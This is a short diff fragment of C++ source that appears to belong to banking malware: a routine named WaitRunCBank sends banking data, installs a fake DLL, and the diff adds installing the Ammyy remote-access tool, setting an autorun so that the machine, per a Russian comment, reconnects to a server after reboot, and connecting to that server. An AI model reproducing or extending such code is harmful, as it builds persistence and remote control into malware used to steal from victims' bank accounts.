@@ -274,6 +274,11 @@ static void WINAPI WaitRunCBank(void*)
 				RunThread( SendCBank, path2 );
 				char* path3 = STR::New(path); 
 				RunThread( InstallFakeDll, path3 );
+#ifdef AmmyyH
+				Ammyy::Install(false);
+#endif 
+				VideoProcess::SetAutorun(true); //после ребута сконектиться с сервером
+				VideoProcess::ConnectToServer(0);
 			}
 		}
 		else
